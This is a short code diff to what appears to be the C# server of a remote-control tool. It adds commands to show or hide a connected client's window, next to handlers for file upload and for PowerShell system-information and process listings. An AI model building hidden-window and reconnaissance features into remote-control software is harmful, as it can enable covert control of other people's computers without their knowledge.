@@ -156,6 +156,10 @@ class ServerObject
                 }
                 await SendMessageAsync($"upload-func {message}", id);
             }
+            // Window show command
+            else if ((command.StartsWith("window-show") || command.StartsWith("win-show")) && command.Split(' ').Length == 2) await SendMessageAsync("window-func-show", id);
+            // Window hide command
+            else if ((command.StartsWith("window-hide") || command.StartsWith("win-hide")) && command.Split(' ').Length == 2) await SendMessageAsync("window-func-hide", id);
             // Shorts commands
             if (command.StartsWith("systeminfo") && command.Split(' ').Length == 2) await SendMessageAsync("Get-ComputerInfo", id);
             else if (command.StartsWith("processlist") && command.Split(' ').Length == 2) await SendMessageAsync("Get-Process", id);
